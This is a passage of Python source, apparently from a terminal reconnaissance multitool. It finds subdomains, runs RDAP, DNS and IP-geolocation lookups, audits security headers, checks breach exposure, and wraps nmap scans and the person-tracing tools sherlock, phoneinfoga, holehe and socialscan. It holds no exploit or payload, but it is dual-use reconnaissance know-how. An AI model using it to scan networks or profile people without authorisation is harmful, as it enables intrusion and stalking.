                     title="REMOTE DATA CAPTURED", border_style="green", box_style=ROUNDED, padding=(1, 2))
        else:
            print(f"\n{Colors.GREEN}[+] REMOTE DATA CAPTURED // SOFTWARE RECORD ANCHOR{Colors.RESET}\n")
            print("-" * 75)
            print(banner.decode('utf-8', errors='ignore').strip())
    except Exception as e:
        ui.error(f"Pipeline Dropped: Stream handshake interface rejected: {e}") if ui else print(f"\n{Colors.RED}[!] Pipeline Dropped: Stream handshake interface rejected: {e}{Colors.RESET}")
        
    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nPress Enter to return to menu directory structure...")

def run_subdomain_finder():

    if ui is not None:
        ui.section("MODULE 07 // PASSIVE DOMAIN SUBDOMAIN FINDER", "cyan")
    else:
        print(f"\n{Colors.AMBER}[MODULE 07 // PASSIVE DOMAIN SUBDOMAIN FINDER]{Colors.RESET}")
    target_root = (ui.prompt_input("Enter target parent root domain (e.g., corporate.com):")
                   if ui is not None
                   else input("\nEnter target parent root domain (e.g., corporate.com): ").strip())
    if not target_root:
        return
        
    if ui is not None:
        ui.info("Opening stream to transparency certificate logs database endpoint...")
    else:
        print(f"\n{Colors.GREEN}Opening stream to transparency certificate logs database endpoint...{Colors.RESET}")
    url = f"https://crt.sh/?q={target_root}&output=json"
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
    
    try:
        with urllib.request.urlopen(req, timeout=15) as response:
            if response.status == 200:
                raw_json = response.read().decode('utf-8')
                data = json.loads(raw_json)
                isolated_subs = set()
                
                for item in data:
                    name_value = item.get('name_value', '')
                    for split_node in name_value.split('\n'):
                        split_node = split_node.strip().lower()
                        if split_node.endswith(target_root) and "*" not in split_node:
                            isolated_subs.add(split_node)
                
                if ui is not None:
                    sub_table = Table(title=f"DISCOVERED SUBDOMAINS ({len(isolated_subs)})",
                                      border_style="green", header_style="bold green", box=ROUNDED)
                    sub_table.add_column("#", style="dim", width=5)
                    sub_table.add_column("SUBDOMAIN", style="cyan", ratio=1)
                    for i, subdomain in enumerate(sorted(isolated_subs), 1):
                        sub_table.add_row(str(i), subdomain)
                    ui.console.print()
                    ui.console.print(sub_table)
                    ui.console.print()
                else:
                    print(f"\n{Colors.GREEN}[+] PASSIVE DISCOVERY RECON LOG INDEX ({len(isolated_subs)} ENTRIES TRACKED){Colors.RESET}")
                    print("-" * 75)
                    for subdomain in sorted(isolated_subs):
                        print(f"  -> Verified Subdomain Host: {Colors.CYAN}{subdomain}{Colors.RESET}")
            else:
                ui.error(f"Server Connection Error: Server dropped protocol flag HTTP {response.status}") if ui else print(f"{Colors.RED}[!] Server Connection Error: Server dropped protocol flag HTTP {response.status}{Colors.RESET}")
    except Exception as e:
        ui.error(f"External Index Disconnected: Registry logs unreadable or stream timeout: {e}") if ui else print(f"\n{Colors.RED}[!] External Index Disconnected: Registry logs unreadable or stream timeout: {e}{Colors.RESET}")
        
    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nProcessing complete. Press Enter to drop layout cache...")

def run_rdap_lookup():

    if ui is not None:
        ui.section("MODULE 08 // ADVANCED RDAP REGISTRATION INFRASTRUCTURE MAPPER", "cyan")
    else:
        print(f"\n{Colors.AMBER}[MODULE 08 // ADVANCED RDAP REGISTRATION INFRASTRUCTURE MAPPER]{Colors.RESET}")
    target_input = (ui.prompt_input("Enter target system IP address or domain path:")
                    if ui is not None
                    else input("Enter target system IP address or domain path: ").strip())
    if not target_input:
        return
        
    is_raw_ip = True
    try:
        socket.inet_aton(target_input)
    except Exception:
        is_raw_ip = False
        
    if not is_raw_ip:
        if ui is not None:
            ui.info("Resolving domain target to network routing address...")
        else:
            print(f"{Colors.GREEN}Resolving domain target to network routing address...{Colors.RESET}")
        try:
            lookup_ip = socket.gethostbyname(target_input)
            if ui is not None:
                ui.info(f"Domain mapped to routing coordinate: {lookup_ip}")
            else:
                print(f"Domain mapped to routing coordinate: {Colors.CYAN}{lookup_ip}{Colors.RESET}")
        except Exception as e:
            ui.warning(f"Error tracking domain mapping: {e}. Attempting direct query format...") if ui else print(f"{Colors.RED}[!] Error tracking domain mapping: {e}. Attempting direct query format...{Colors.RESET}")
            lookup_ip = target_input
    else:
        lookup_ip = target_input

    if ui is not None:
        ui.info("Sending configuration request packet array to RDAP name registries...")
    else:
        print(f"\n{Colors.GREEN}Sending configuration request packet array to RDAP name registries...{Colors.RESET}")
    url = f"https://rdap.org/ip/{lookup_ip}"
    req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
    
    try:
        with urllib.request.urlopen(req, timeout=12) as response:
            raw_data = response.read().decode('utf-8')
            parsed_records = json.loads(raw_data)
            
            rdap_data = [
                ("Primary Entity Identifier", parsed_records.get('name', 'UNKNOWN')),
                ("Assigned Allocation Block", f"{parsed_records.get('startAddress', 'N/A')} - {parsed_records.get('endAddress', 'N/A')}"),
                ("Registered Country Code", parsed_records.get('country', 'UNKNOWN')),
            ]
            
            entities = parsed_records.get('entities', [])
            if entities:
                vcard = entities[0].get('vcardArray', [])
                if len(vcard) > 1:
                    for element in vcard[1]:
                        if element[0] == 'fn':
                            rdap_data.append(("Administrative Provider", element[3]))
            
            if ui is not None:
                ui.result_table("PRODUCTION INFRASTRUCTURE METRIC DATA BLOCKS",
                                ["FIELD", "VALUE"], rdap_data, border_style="green")
            else:
                print(f"\n{Colors.GREEN}[+] PRODUCTION INFRASTRUCTURE METRIC DATA BLOCKS{Colors.RESET}")
                print("-" * 75)
                print(f"  -> Primary Entity Identifier : {Colors.CYAN}{parsed_records.get('name', 'UNKNOWN')}{Colors.RESET}")
                print(f"  -> Assigned Allocation Block : {parsed_records.get('startAddress', 'N/A')} - {parsed_records.get('endAddress', 'N/A')}")
                print(f"  -> Registered Country Code   : {parsed_records.get('country', 'UNKNOWN')}")
            
                entities = parsed_records.get('entities', [])
                if entities:
                    vcard = entities[0].get('vcardArray', [])
                    if len(vcard) > 1:
                        for element in vcard[1]:
                            if element[0] == 'fn':
                                print(f"  -> Administrative Provider  : {Colors.AMBER}{element[3]}{Colors.RESET}")
    except Exception as err:
        if ui is not None:
            ui.error(f"Registry Allocation Block Record Missing or Timeout: {err}")
        else:
            print(f"\n{Colors.RED}[!] Registry Allocation Block Record Missing or Timeout: {err}{Colors.RESET}")
        
    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nModule pipeline sequence finished. Press Enter to navigate back to choices...")

def run_http_header_auditor():

    if ui is not None:
        ui.section("MODULE 09 // HTTP HEADER SECURITY COMPLIANCE & HARDENING AUDITOR", "cyan")
    else:
        print(f"\n{Colors.AMBER}[MODULE 09 // HTTP HEADER SECURITY COMPLIANCE & HARDENING AUDITOR]{Colors.RESET}")
    target_url = (ui.prompt_input("Enter target domain or URL (e.g., example.com):")
                  if ui is not None
                  else input("Enter target domain or URL (e.g., example.com): ").strip())
    if not target_url:
        return
        
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "https://" + target_url
        
    if ui is not None:
        ui.info("Sending connection handshake request to analyze header configurations...")
    else:
        print(f"\n{Colors.GREEN}Sending connection handshake request to analyze header configurations...{Colors.RESET}")
    req = urllib.request.Request(target_url, headers={'User-Agent': 'Mainframe-Terminal-Multitool-Auditor'})
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            headers = response.info()
            
            security_headers = {
                "Content-Security-Policy": "Mitigates XSS and data injection attacks by restricting trusted resource boundaries.",
                "Strict-Transport-Security": "Forces encrypted HTTPS connections, preventing man-in-the-middle decryption exploits.",
                "X-Frame-Options": "Prevents clickjacking loops by disabling webpage nesting inside unauthorized iframes.",
                "X-Content-Type-Options": "Enforces strict MIME-sniffing protection, preventing content confusion attacks.",
                "X-XSS-Protection": "Legacy cross-site scripting filter context mechanism. Often replaced by standard CSP rules."
            }
            
            if ui is not None:
                hdr_table = Table(title="SECURITY COMPLIANCE TELEMETRY REPORT",
                                  border_style="green", header_style="bold green", box=ROUNDED)
                hdr_table.add_column("SECURITY HEADER", style="bold", width=30)
                hdr_table.add_column("STATUS", width=12)
                hdr_table.add_column("MITIGATION PURPOSE", ratio=1)
                hdr_table.add_column("CONFIGURED VALUE", ratio=1)
                
                for header, purpose in security_headers.items():
                    value = headers.get(header)
                    if value:
                        hdr_table.add_row(header, "[green]PRESENT[/green]", purpose, str(value))
                    else:
                        hdr_table.add_row(header, "[red]MISSING[/red]", purpose, "N/A")
                ui.console.print()
                ui.console.print(hdr_table)
                ui.console.print()
            else:
                print(f"\n{Colors.GREEN}[+] SECURITY COMPLIANCE TELEMETRY REPORT{Colors.RESET}")
                print("-" * 90)
                print(f"{Colors.BOLD}{'AUDITED SECURITY HEADER':<30}{'STATUS':<15}{'CORE MITIGATION PURPOSE'}{Colors.RESET}")
                print("-" * 90)
                
                for header, purpose in security_headers.items():
                    value = headers.get(header)
                    if value:
                        print(f"{Colors.GREEN}{header:<30}{'PRESENT':<15}{Colors.RESET}{Colors.CYAN}{purpose}{Colors.RESET}")
                        print(f"  +-- Configured Value: {Colors.AMBER}{value}{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}{header:<30}{'MISSING':<15}{Colors.RESET}{Colors.RED}{purpose}{Colors.RESET}")
    except Exception as e:
        if ui is not None:
            ui.error(f"Failed to complete HTTP connection stream context audit: {e}")
        else:
            print(f"\n{Colors.RED}[!] Failed to complete HTTP connection stream context audit: {e}{Colors.RESET}")
        
    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nAudit operations complete. Press Enter to load submenu options...")

def run_doh_resolver():

    if ui is not None:
        ui.section("MODULE 10 // DNS-OVER-HTTPS (DOH) CLIENT RESOLVER SUBSYSTEM", "cyan",
                   subtitle="Issues secure encrypted name queries over port 443 to Cloudflare public resolvers natively.")
    else:
        print(f"\n{Colors.AMBER}[MODULE 10 // DNS-OVER-HTTPS (DOH) CLIENT RESOLVER SUBSYSTEM]{Colors.RESET}")
        print("Issues secure encrypted name queries over port 443 to Cloudflare public resolvers natively.")
    target_domain = (ui.prompt_input("Enter domain identifier to resolve (e.g., google.com):")
                     if ui is not None
                     else input("\nEnter domain identifier to resolve (e.g., google.com): ").strip())
    if not target_domain:
        return
        
    if ui is not None:
        print_choices = ui
        from rich.text import Text as _Text
        _t = _Text()
        _t.append("Select record type:\n", style="bold")
        _t.append("  [1] A  (IPv4 Address)\n", style="cyan")
        _t.append("  [2] AAAA (IPv6 Address)\n", style="cyan")
        _t.append("  [3] MX (Mail Exchange)\n", style="cyan")
        _t.append("  [4] TXT (Text Records)", style="cyan")
        ui.console.print(_t)
        choice = ui.console.input("[bold yellow]  Enter choice (1-4) [Default: 1]: [/bold yellow]").strip() or "1"
    else:
        print("Select target resource mapping record configuration tracker:")
        print(" [1] A (Standard IPv4 Address)\n [2] AAAA (Modern IPv6 Address)\n [3] MX (Mail Exchange Server Arrays)\n [4] TXT (Text Verification Nodes)")
        choice = input("Enter tracking choice (1-4): ").strip()
    record_type = {"1": "A", "2": "AAAA", "3": "MX", "4": "TXT"}.get(choice, "A")
    
    if ui is not None:
        ui.info("Dispatching secure encrypted HTTPS GET packet query to cloudflare-dns.com...")
    else:
        print(f"\n{Colors.GREEN}Dispatching secure encrypted HTTPS GET packet query to cloudflare-dns.com...{Colors.RESET}")
    url = f"https://cloudflare-dns.com/dns-query?name={target_domain}&type={record_type}"
    req = urllib.request.Request(url, headers={'Accept': 'application/dns-json', 'User-Agent': 'Mainframe-DoH-Core'})
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            raw_data = response.read().decode('utf-8')
            parsed_payload = json.loads(raw_data)
            
            status_code = parsed_payload.get("Status", -1)
            if ui is not None:
                ui.success(f"Encrypted DoH response synchronized // STATUS: {status_code}")
            else:
                print(f"\n{Colors.GREEN}[+] ENCRYPTED DO-H RESPONSE SYNCHRONIZED // STATUS: {status_code}{Colors.RESET}")
            
            answers = parsed_payload.get("Answer", [])
            if answers:
                if ui is not None:
                    doh_table = Table(title="DNS RECORDS", border_style="cyan", header_style="bold cyan", box=ROUNDED)
                    doh_table.add_column("RECORD NAME", style="cyan", width=25)
                    doh_table.add_column("TYPE", width=8)
                    doh_table.add_column("TTL", width=12)
                    doh_table.add_column("DATA", ratio=1)
                    for entry in answers:
                        type_id = entry.get("type", -1)
                        doh_table.add_row(entry.get('name', ''), str(type_id), str(entry.get('TTL', '')), entry.get('data', ''))
                    ui.console.print()
                    ui.console.print(doh_table)
                    ui.console.print()
                else:
                    print(f"{Colors.BOLD}{'RECORD NAME':<25}{'TYPE':<8}{'TTL':<10}{'RESOLVED DATA MAPPING VALUE'}{Colors.RESET}")
                    print("-" * 75)
                    for entry in answers:
                        type_id = entry.get("type", -1)
                        print(f"  {entry.get('name'):<23}{type_id:<8}{entry.get('TTL'):<10}{Colors.CYAN}{entry.get('data')}{Colors.RESET}")
            else:
                ui.warning("No DNS entries returned inside the encrypted answer payload array.") if ui else print(f"{Colors.RED}[!] No DNS entries returned inside the encrypted answer payload array.{Colors.RESET}")
    except Exception as e:
        if ui is not None:
            ui.error(f"Encryption query dropped: DoH client failed to parse response: {e}")
        else:
            print(f"\n{Colors.RED}[!] Encryption query dropped: DoH client failed to parse response: {e}{Colors.RESET}")
        
    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nQuery complete. Press Enter to load submenu options...")

def run_ip_lookup():

    if ui is not None:
        ui.section("MODULE 11 // IP ADDRESS GEOLOCATION & METADATA LOOKUP", "cyan")
    else:
        print(f"\n{Colors.AMBER}[MODULE 11 // IP ADDRESS GEOLOCATION & METADATA LOOKUP]{Colors.RESET}")
    target_ip = (ui.prompt_input("Enter IP address to lookup:")
                 if ui is not None
                 else input("\nEnter IP address to lookup: ").strip())
    if not target_ip:
        return
    
    if ui is not None:
        ui.info("Querying ip-api.com for IP metadata...")
    else:
        print(f"\n{Colors.GREEN}Querying ip-api.com for IP metadata...{Colors.RESET}")
    url = f"http://ip-api.com/json/{target_ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy,hosting"
    req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-IP-Lookup'})
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            raw_data = response.read().decode('utf-8')
            parsed = json.loads(raw_data)
            
            if parsed.get("status") == "fail":
                if ui is not None:
                    ui.error(f"Lookup failed: {parsed.get('message', 'Unknown error')}")
                else:
                    print(f"\n{Colors.RED}[!] Lookup failed: {parsed.get('message', 'Unknown error')}{Colors.RESET}")
                input(f"\nPress Enter to load submenu options...")
                return
            
            ip_data = [
                ("IP Address", target_ip),
                ("Country", parsed.get('country', 'N/A')),
                ("Country Code", parsed.get('countryCode', 'N/A')),
                ("Region", parsed.get('regionName', 'N/A')),
                ("City", parsed.get('city', 'N/A')),
                ("ZIP Code", parsed.get('zip', 'N/A')),
                ("Coordinates", f"{parsed.get('lat', 'N/A')}, {parsed.get('lon', 'N/A')}"),
                ("Timezone", parsed.get('timezone', 'N/A')),
                ("ISP", parsed.get('isp', 'N/A')),
                ("Organization", parsed.get('org', 'N/A')),
                ("AS Number", parsed.get('as', 'N/A')),
                ("Reverse DNS", parsed.get('reverse', 'N/A')),
                ("Mobile", str(parsed.get('mobile', 'N/A'))),
                ("Proxy", str(parsed.get('proxy', 'N/A'))),
                ("Hosting", str(parsed.get('hosting', 'N/A'))),
            ]
            
            if ui is not None:
                ui.result_table(f"IP LOOKUP RESULTS — {target_ip}", ["FIELD", "VALUE"], ip_data, border_style="green")
            else:
                print(f"\n{Colors.GREEN}[+] IP LOOKUP RESULTS // {target_ip}{Colors.RESET}")
                print("-" * 75)
                print(f"{Colors.BOLD}{'FIELD':<20}{'VALUE'}{Colors.RESET}")
                print("-" * 75)
                print(f"{'IP Address':<20}{Colors.CYAN}{target_ip}{Colors.RESET}")
                print(f"{'Country':<20}{Colors.CYAN}{parsed.get('country', 'N/A')}{Colors.RESET}")
                print(f"{'Country Code':<20}{Colors.CYAN}{parsed.get('countryCode', 'N/A')}{Colors.RESET}")
                print(f"{'Region':<20}{Colors.CYAN}{parsed.get('regionName', 'N/A')}{Colors.RESET}")
                print(f"{'City':<20}{Colors.CYAN}{parsed.get('city', 'N/A')}{Colors.RESET}")
                print(f"{'ZIP Code':<20}{Colors.CYAN}{parsed.get('zip', 'N/A')}{Colors.RESET}")
                print(f"{'Coordinates':<20}{Colors.CYAN}{parsed.get('lat', 'N/A')}, {parsed.get('lon', 'N/A')}{Colors.RESET}")
                print(f"{'Timezone':<20}{Colors.CYAN}{parsed.get('timezone', 'N/A')}{Colors.RESET}")
                print(f"{'ISP':<20}{Colors.CYAN}{parsed.get('isp', 'N/A')}{Colors.RESET}")
                print(f"{'Organization':<20}{Colors.CYAN}{parsed.get('org', 'N/A')}{Colors.RESET}")
                print(f"{'AS Number':<20}{Colors.CYAN}{parsed.get('as', 'N/A')}{Colors.RESET}")
                print(f"{'Reverse DNS':<20}{Colors.CYAN}{parsed.get('reverse', 'N/A')}{Colors.RESET}")
                print(f"{'Mobile':<20}{Colors.CYAN}{str(parsed.get('mobile', 'N/A'))}{Colors.RESET}")
                print(f"{'Proxy':<20}{Colors.CYAN}{str(parsed.get('proxy', 'N/A'))}{Colors.RESET}")
                print(f"{'Hosting':<20}{Colors.CYAN}{str(parsed.get('hosting', 'N/A'))}{Colors.RESET}")
                print("-" * 75)
    except Exception as e:
        if ui is not None:
            ui.error(f"IP lookup failed: {e}")
        else:
            print(f"\n{Colors.RED}[!] IP lookup failed: {e}{Colors.RESET}")
    
    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nPress Enter to load submenu options...")

def run_nmap_scan():

    if ui is not None:
        ui.section("MODULE 12 // NEXUS ADVANCED PORT SCANNER (NMAP)", "cyan")
    else:
        print(f"\n{Colors.AMBER}[MODULE 12 // NEXUS ADVANCED PORT SCANNER (NMAP)]{Colors.RESET}")
    target = (ui.prompt_input("Enter target IP / hostname / CIDR range:") if ui is not None else input("\nEnter target IP / hostname / CIDR range: ").strip())
    if not target:
        return

    executable_path = find_global_command('nmap')
    if not executable_path or not os.path.exists(executable_path):
        if ui is not None:
            ui.error("Binary Not Found: nmap is not installed or not in system PATH.")
            ui.warning("Install via: choco install nmap or download from https://nmap.org/")
        else:
            print(f"{Colors.RED}[!] Binary Not Found: nmap is not installed or not in system PATH.{Colors.RESET}")
            print(f"{Colors.AMBER}    Install via: choco install nmap or download from https://nmap.org/{Colors.RESET}")
        input(f"\nPress Enter to load submenu options...")
        return

    scan_choices = [
        ("1", "Quick TCP scan (top 1000 ports)"),
        ("2", "Full TCP scan (all 65535 ports)"),
        ("3", "Service/version detection"),
        ("4", "OS fingerprinting"),
        ("5", "Aggressive scan (service + OS + traceroute)"),
        ("6", "Custom arguments"),
    ]
    if ui is not None:
        ui.console.print()
        scan_table = Table(title="SCAN TYPE SELECTION", border_style="cyan", header_style="bold cyan", box=ROUNDED)
        scan_table.add_column("OPTION", style="bold yellow", width=8)
        scan_table.add_column("DESCRIPTION", ratio=1)
        for num, desc in scan_choices:
            scan_table.add_row(num, desc)
        ui.console.print(scan_table)
        scan_choice = ui.console.input("[bold yellow]\n  Enter choice (1-6) [Default: 1]: [/bold yellow]").strip() or "1"
    else:
        print("\nSelect scan type:")
        print("  [1] Quick TCP scan (top 1000 ports)")
        print("  [2] Full TCP scan (all 65535 ports)")
        print("  [3] Service/version detection")
        print("  [4] OS fingerprinting")
        print("  [5] Aggressive scan (service + OS + traceroute)")
        print("  [6] Custom arguments")
        scan_choice = input("Enter choice (1-6) [Default: 1]: ").strip() or "1"

    scan_map = {
        "1": ["-F"],
        "2": ["-p-"],
        "3": ["-sV"],
        "4": ["-O"],
        "5": ["-A"],
    }

    if scan_choice == "6":
        custom_args = input("Enter custom nmap arguments: ").strip()
        cmd = [executable_path, target] + custom_args.split()
    else:
        cmd = [executable_path] + scan_map.get(scan_choice, ["-F"]) + [target]

    if ui is not None:
        ui.console.print(f"\n[cyan]Command:[/] {' '.join(cmd)}")
        confirm = ui.console.input("[bold yellow]\n  Execute scan? (Y/N): [/bold yellow]").strip().upper()
    else:
        print(f"\n{Colors.CYAN}Command: {' '.join(cmd)}{Colors.RESET}")
        confirm = input("\nExecute scan? (Y/N): ").strip().upper()
    if confirm != 'Y':
        if ui is not None:
            ui.warning("Aborted by operator.")
        else:
            print(f"{Colors.AMBER}Aborted by operator.{Colors.RESET}")
        return

    if ui is not None:
        ui.info("Launching nmap...")
    else:
        print(f"\n{Colors.GREEN}Launching nmap...{Colors.RESET}")
    try:
        subprocess.run(cmd, capture_output=False, text=True)
    except KeyboardInterrupt:
        if ui is not None:
            ui.warning("Scan interrupted by operator.")
        else:
            print(f"\n{Colors.AMBER}[!] Scan interrupted by operator.{Colors.RESET}")
    except Exception as e:
        if ui is not None:
            ui.error(f"Execution error: {e}")
        else:
            print(f"{Colors.RED}[!] Execution error: {e}{Colors.RESET}")

    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nPress Enter to load submenu options...")



def run_sherlock_hook():

    if ui is not None: ui.section("MODULE 01 // LIVE SYSTEM LAUNCH: SHERLOCK USERNAME TRACER", "cyan")
    else: print(f"\n{Colors.CYAN}[MODULE 01 // LIVE SYSTEM LAUNCH: SHERLOCK USERNAME TRACER]{Colors.RESET}")
    target_user = (ui.prompt_input("Enter target handle alias to trace:") if ui is not None else input("\nEnter target handle alias to trace: ").strip())
    if not target_user: return
    if ui is not None: ui.info("Spawning live shell execution sandbox subprocess environment...")
    else: print(f"\n{Colors.GREEN}Spawning live shell execution sandbox subprocess environment...{Colors.RESET}")
    executable_target = find_global_command('sherlock')
    if ui is not None: print(f"  Running context: [cyan]{executable_target} {target_user} --timeout 5[/cyan]")
    else: print(f"Running context: {executable_target} {target_user} --timeout 5\n")
    print("-" * 75)
    try:
        subprocess.run([executable_target, target_user, '--timeout', '5'], capture_output=False, text=True)
    except FileNotFoundError:
        if ui is not None:
            ui.error("Environment Path Exception: System variables cannot locate the executable command.")
            ui.info("Resolve this by configuring your shell or executing: pipx install sherlock-project")
        else:
            print(f"{Colors.RED}[!] Environment Path Exception: System variables cannot locate the executable command.{Colors.RESET}")
            print("Resolve this by configuring your shell or executing: pipx install sherlock-project")
    print("-" * 75)
    input(f"\nSubprocess returned exit context code. Press Enter to open submenu...")

def run_phoneinfoga_hook():

    if ui is not None: ui.section("MODULE 02 // LIVE SYSTEM LAUNCH: PHONEINFOGA TELECOM SCANNER", "cyan")
    else: print(f"\n{Colors.CYAN}[MODULE 02 // LIVE SYSTEM LAUNCH: PHONEINFOGA TELECOM SCANNER]{Colors.RESET}")
    target_number = (ui.prompt_input("Enter target telephone with country code (e.g., +14155552671):") if ui is not None else input("\nEnter target layout telephone with country flag code (e.g., +14155552671): ").strip())
    if not target_number: return
    if ui is not None: ui.info("Spawning live shell execution sandbox subprocess environment...")
    else: print(f"\n{Colors.GREEN}Spawning live shell execution sandbox subprocess environment...{Colors.RESET}")
    executable_target = find_global_command('phoneinfoga')
    if ui is not None: print(f"  Running context: [cyan]{executable_target} scan -n {target_number}[/cyan]")
    else: print(f"Running context: {executable_target} scan -n {target_number}\n")
    print("-" * 75)
    try:
        subprocess.run([executable_target, 'scan', '-n', target_number], capture_output=False, text=True)
    except FileNotFoundError:
        if ui is not None:
            ui.error("Environment Path Exception: Local machine environment cannot see binary configuration nodes.")
            ui.info("Verify your workspace subfolder assets or ensure the program path is added to your environment rules.")
        else:
            print(f"{Colors.RED}[!] Environment Path Exception: Local machine environment cannot see binary configuration nodes.{Colors.RESET}")
            print("Verify your workspace subfolder assets or ensure the program path is added to your environment rules.")
    print("-" * 75)
    input(f"\nSubprocess returned exit context code. Press Enter to open submenu...")

def run_holehe_hook():

    if ui is not None: ui.section("MODULE 03 // LIVE SYSTEM LAUNCH: HOLEHE EMAIL PLATFORM AUDITOR", "cyan")
    else: print(f"\n{Colors.CYAN}[MODULE 03 // LIVE SYSTEM LAUNCH: HOLEHE EMAIL PLATFORM AUDITOR]{Colors.RESET}")
    target_mail = (ui.prompt_input("Enter target email address profile to trace:") if ui is not None else input("\nEnter target email address profile to trace: ").strip())
    if not target_mail or "@" not in target_mail:
        if ui is not None:
            ui.error("Input Format Validation Error: Invalid structure format tracking input.")
        else:
            print(f"{Colors.RED}[!] Input Format Validation Error: Invalid structure format tracking input.{Colors.RESET}")
        time.sleep(1)
        return
    if ui is not None: ui.info("Spawning live shell execution sandbox subprocess environment...")
    else: print(f"\n{Colors.GREEN}Spawning live shell execution sandbox subprocess environment...{Colors.RESET}")
    executable_target = find_global_command('holehe')
    if ui is not None: print(f"  Running context: [cyan]{executable_target} {target_mail}[/cyan]")
    else: print(f"Running context: {executable_target} {target_mail}\n")
    print("-" * 75)
    try:
        subprocess.run([executable_target, target_mail], capture_output=False, text=True)
    except FileNotFoundError:
        if ui is not None:
            ui.error("Environment Path Exception: Execution link dropped due to missing package file structures.")
            ui.info("Deploy capabilities to your local python setup via terminal step: pip install holehe")
        else:
            print(f"{Colors.RED}[!] Environment Path Exception: Execution link dropped due to missing package file structures.{Colors.RESET}")
            print("Deploy capabilities to your local python setup via terminal step: pip install holehe")
    print("-" * 75)
    input(f"\nSubprocess returned exit context code. Press Enter to open submenu...")

def run_socialscan_hook():

    if ui is not None: ui.section("MODULE 04 // LIVE SYSTEM LAUNCH: SOCIALSCAN CONCURRENT IDENTITY PROFILER", "cyan")
    else: print(f"\n{Colors.CYAN}[MODULE 04 // LIVE SYSTEM LAUNCH: SOCIALSCAN CONCURRENT IDENTITY PROFILER]{Colors.RESET}")
    target_string = (ui.prompt_input("Enter target credential handle or mail index to cross-reference:") if ui is not None else input("\nEnter target credential handle or mail index to cross-reference: ").strip())
    if not target_string: return
    if ui is not None: ui.info("Spawning live shell execution sandbox subprocess environment...")
    else: print(f"\n{Colors.GREEN}Spawning live shell execution sandbox subprocess environment...{Colors.RESET}")
    executable_target = find_global_command('socialscan')
    if ui is not None: print(f"  Running context: [cyan]{executable_target} {target_string}[/cyan]")
    else: print(f"Running context: {executable_target} {target_string}\n")
    print("-" * 75)
    try:
        subprocess.run([executable_target, target_string], capture_output=False, text=True)
    except FileNotFoundError:
        if ui is not None:
            ui.error("Environment Path Exception: Script link trace dropped due to unprovisioned package headers.")
            ui.info("Provision this workspace framework layer by executing command step: pip install socialscan")
        else:
            print(f"{Colors.RED}[!] Environment Path Exception: Script link trace dropped due to unprovisioned package headers.{Colors.RESET}")
            print("Provision this workspace framework layer by executing command step: pip install socialscan")
    print("-" * 75)
    input(f"\nSubprocess returned exit context code. Press Enter to open submenu...")

def run_live_breach_checker():

    if ui is not None: ui.section("MODULE 05 // LIVE ONLINE DATA BREACH EXPLORER & PASSWORD LEAK CHECKER", "cyan")
    else: print(f"\n{Colors.CYAN}[MODULE 05 // LIVE ONLINE DATA BREACH EXPLORER & PASSWORD LEAK CHECKER]{Colors.RESET}")
    mode = (ui.console.input("[bold yellow]  Select inspection mode (1/2) [1=Email / 2=Password]: [/bold yellow]").strip()
            if ui is not None else input("Select inspection target mode (1/2): ").strip())

    if mode == "1":
        target_email = input("\nEnter target email address to audit: ").strip()
        if not target_email or "@" not in target_email:
            print(f"{Colors.RED}[!] Format Error: Invalid email structure.{Colors.RESET}")
            time.sleep(1.2)
            return
        print(f"\n{Colors.GREEN}Querying XposedOrNot live database registry...{Colors.RESET}")
        url = f"https://xposedornot.com/api/v1/account/{target_email}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
        try:
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    raw_json = response.read().decode('utf-8')
                    parsed_data = json.loads(raw_json)
            if ui is not None:
                ui.error("EXPOSURE FOUND INSIDE INDEXED DATA LEAKS")
                if isinstance(parsed_data, dict) and "breaches_details" in parsed_data:
                    details = parsed_data.get("breaches_details", {})
                    breach_rows = [(name, "") for name in details]
                    ui.result_table("EXPOSED SOURCES", ["BREACH SOURCE", "DETAILS"], breach_rows, border_style="red")
                else:
                    ui.info("Record tracked inside independent credential dumps or paste files.")
            else:
                print(f"\n{Colors.RED}[!] EXPOSURE FOUND INSIDE INDEXED DATA LEAKS{Colors.RESET}")
                print("-" * 75)
                if isinstance(parsed_data, dict) and "breaches_details" in parsed_data:
                    details = parsed_data.get("breaches_details", {})
                    for breach_name in details:
                        print(f"  -> Exposed Source: {Colors.AMBER}{breach_name}{Colors.RESET}")
                else:
                    print("  -> Record tracked inside independent credential dumps or paste files.")
        except urllib.error.HTTPError as err:
            if err.code == 404:
                if ui is not None:
                    ui.success("STATUS SECURE: No data breaches discovered for this email.")
                else:
                    print(f"\n{Colors.GREEN}[+] STATUS SECURE: No data data breaches discovered for this email.{Colors.RESET}")
            else:
                print(f"\n{Colors.RED}[!] API query dropped: HTTP status code {err.code}{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.RED}[!] Connection pipeline error: {e}{Colors.RESET}")
            
    elif mode == "2":
        target_password = input("\nEnter target plaintext password to audit: ").strip()
        if not target_password:
            return
        print(f"\n{Colors.GREEN}Hashing locally and generating k-anonymity anonymous range request...{Colors.RESET}")
        sha1_hash = hashlib.sha1(target_password.encode('utf-8')).hexdigest().upper()
        prefix = sha1_hash[:5]
        suffix = sha1_hash[5:]
        
        url = f"https://api.pwnedpasswords.com/range/{prefix}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
        try:
            with urllib.request.urlopen(req, timeout=10) as response:
                lines = response.read().decode('utf-8').splitlines()
                match_count = 0
                for line in lines:
                    if ":" in line:
                        hash_suffix, count_str = line.split(":")
